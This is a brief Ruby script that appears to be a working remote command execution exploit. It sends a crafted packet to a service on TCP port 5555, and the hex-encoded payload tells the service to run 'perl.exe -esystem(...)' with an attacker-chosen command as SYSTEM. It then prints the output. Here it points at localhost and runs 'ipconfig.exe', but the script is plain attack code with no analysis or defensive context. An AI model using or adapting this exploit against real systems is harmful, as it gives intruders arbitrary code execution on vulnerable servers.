require 'hex_string'
require 'socket'
include Socket::Constants

socket = Socket.new(AF_INET, SOCK_STREAM, 0)
sockaddr = Socket.pack_sockaddr_in(5555, '127.0.0.1')
socket.connect(sockaddr)
cmd = 'ipconfig.exe' # ipconfig.exe => "69 70 63 6f 6e 66 69 67 2e 65 78 65"
hex = "00 00 00 49 20 32 00 20 6e 65 73 73 75 73 00 20 30 00 20 53 59 53 54 45 4d 00 20 6e 65 73 73 75 73 00 20 43 00 20 32 38 00 20 70 65 72 6c 2e 65 78 65 00 20 2d 65 73 79 73 74 65 6d 28 27 " \
      + cmd.to_hex_string \
      + " 27 29 00"
data = hex.to_byte_string
socket.write(data)
while message = socket.gets
  print message
end
socket.close()
